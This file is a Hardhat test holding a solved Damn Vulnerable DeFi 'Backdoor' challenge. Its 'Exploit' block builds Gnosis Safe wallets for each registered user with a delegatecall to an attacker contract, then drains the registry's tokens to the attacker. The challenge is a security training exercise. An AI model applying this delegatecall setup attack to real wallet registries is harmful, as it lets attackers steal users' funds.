const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const BackdoorAttacker = await ethers.getContractFactory('BackdoorAttacker', attacker);
        var attack_contract = await BackdoorAttacker.deploy(this.token.address);

        // The flaw is that WalletRegistry assumes only Alice can create a wallet in her name.
        // Checking if the wallet only has one owner is not a sufficient mitigation: we still 
        // can control the wallet by providing an optional delegateCall.
        const approveCall = attack_contract.interface.encodeFunctionData("approve", []);
        for (let i = 0; i < users.length; i++) {
            const initCode = this.masterCopy.interface.encodeFunctionData("setup", [
                [users[i]],                         // _owners
                1,                                  // _threshold
                attack_contract.address,            // to (optional delegateCall)
                approveCall,                        // data (optional delegateCall)
                ethers.constants.AddressZero,       // fallbackHandler
                ethers.constants.AddressZero,       // paymentToken
                0,                                  // payment
                ethers.constants.AddressZero        // paymentReceiver
            ]);


            const tx = await this.walletFactory.connect(attacker).createProxyWithCallback(
                this.masterCopy.address,
                initCode,
                0,
                this.walletRegistry.address
            );
            const receipt = await tx.wait();
            const event = receipt.events.find(event => event.event === "ProxyCreation");
            const userWallet = event.args.proxy;
        
            await this.token.connect(attacker).transferFrom(userWallet, attacker.address, ethers.utils.parseEther("10"));
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
